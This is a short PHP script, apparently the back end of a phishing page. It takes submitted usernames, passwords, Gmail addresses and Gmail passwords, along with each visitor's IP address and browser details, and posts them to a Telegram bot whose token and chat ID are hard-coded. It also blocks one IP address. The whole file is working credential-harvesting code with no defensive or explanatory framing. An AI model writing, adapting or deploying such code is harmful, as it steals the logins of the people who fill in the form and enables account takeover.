<?php

if ($_SERVER['REMOTE_ADDR']=='62.89.209.157'){
    die("вход зп ()");
}

$ip=$_SERVER['REMOTE_ADDR'];
echo $ip;
$about=$_SERVER['HTTP_USER_AGENT'];
$name = $_POST['user_name'];
$password = $_POST['user_pass'];
$text=$_POST['user_text'];
$gmail=$_POST['user_gmail'];
$gmpas=$_POST['user_gmailpas'];
$token = "6914849085:AAHo7QNpc15umgW8-ezax4YC9gwEjRkSihg";
$chat_id = "-4133161600";
$data=date(" Y-m-d H:i:s");
$site="o928118x.beget.tech (beget)";
$arr = array(
  'Username: ' => $name,
  'Password: ' => $password,
   'gmail: '=>$gmail,
  'gmail password: '=>$gmpas,
  'IP: '=>$ip,
  'Данные о браузер и устройстве: '=>$about,
  'дата и время запроса: '=>$data,
  'Запрос от сайта: '=>$site,
 );

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

/*if ($sendToTelegram) {
 header('Location: thank-you.html');
} else {
echo "Error";
}*/



// Список заблокированных IP-адресов
$blocked_ips = array(
    '62.89.209.157', // Добавьте сюда IP-адреса, которые вы хотите заблокировать
    '62.89.209.157'
);

// Получаем IP-адрес посетителя
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Проверяем, есть ли IP-адрес посетителя в списке заблокированных
if (in_array($visitor_ip, $blocked_ips)) {
     header("HTTP/1.1 403 Forbidden");
    echo "Доступ к сайту запрещен.";
    exit;
}
?>